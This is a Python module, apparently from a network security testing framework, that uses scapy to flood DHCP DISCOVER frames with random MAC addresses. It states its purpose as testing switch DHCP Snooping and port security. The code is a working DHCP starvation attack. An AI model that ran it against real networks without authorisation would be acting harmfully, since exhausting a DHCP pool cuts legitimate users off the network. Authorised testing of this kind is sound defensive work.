"""DHCP Starvation and Pool Exhaustion Test Module.

Generates rapid bursts of DHCP DISCOVER frames with randomized client
hardware addresses (chaddr) to test whether switch DHCP Snooping and
port security policies effectively throttle and isolate rogue requests.
"""

import time
from datetime import datetime
from typing import Optional

from scapy.all import BOOTP, DHCP, Ether, IP, RandInt, RandMAC, UDP, sendp

from attacks.base import BaseAttack
from common.models import AttackResult


class DHCPStarvation(BaseAttack):
    """Simulates DHCP pool exhaustion to test switch rate-limiting."""

    attack_type = "dhcp_starvation"

    def __init__(
        self,
        interface: str = "eth0",
        target_server: str = "255.255.255.255",
        dry_run: bool = False,
    ):
        """Initialize the DHCP starvation test runner.

        Args:
            interface: Network interface to transmit frames on.
            target_server: Broadcast or specific DHCP server IP.
            dry_run: If True, crafts frames without raw socket transmission.
        """
        self.interface = interface
        self.target_server = target_server
        self.dry_run = dry_run

    def build_discover_frame(self, client_mac: Optional[str] = None) -> Ether:
        """Craft a single DHCP DISCOVER frame with a client hardware address."""
        chaddr_mac = client_mac or str(RandMAC())
        # Convert MAC string to 6 bytes for BOOTP chaddr field
        mac_bytes = bytes.fromhex(chaddr_mac.replace(":", "").replace("-", ""))

        frame = (
            Ether(src=chaddr_mac, dst="ff:ff:ff:ff:ff:ff")
            / IP(src="0.0.0.0", dst=self.target_server)
            / UDP(sport=68, dport=67)
            / BOOTP(
                op=1,  # BOOTREQUEST
                chaddr=mac_bytes + b"\x00" * 10,
                xid=int(RandInt()),
            )
            / DHCP(options=[("message-type", "discover"), "end"])
        )
        return frame

    def launch(self, count: int = 25, interval: float = 0.02) -> AttackResult:
        """Execute the DHCP starvation test burst.

        Args:
            count: Number of synthetic DISCOVER frames to transmit.
            interval: Delay in seconds between frames.

        Returns:
            AttackResult with telemetry on packets sent and duration.
        """
        start_time = datetime.now()
        sent = 0

        for _ in range(count):
            frame = self.build_discover_frame()
            if not self.dry_run:
                try:
                    sendp(frame, iface=self.interface, verbose=False)
                    sent += 1
                except Exception:
                    pass
            else:
                sent += 1
            if interval > 0:
                time.sleep(interval)

        duration = (datetime.now() - start_time).total_seconds()
        return AttackResult(
            attack_type=self.attack_type,
            packets_sent=sent,
            duration_s=duration,
            start_time=start_time,
            mitre_attack_id="T1499",
        )
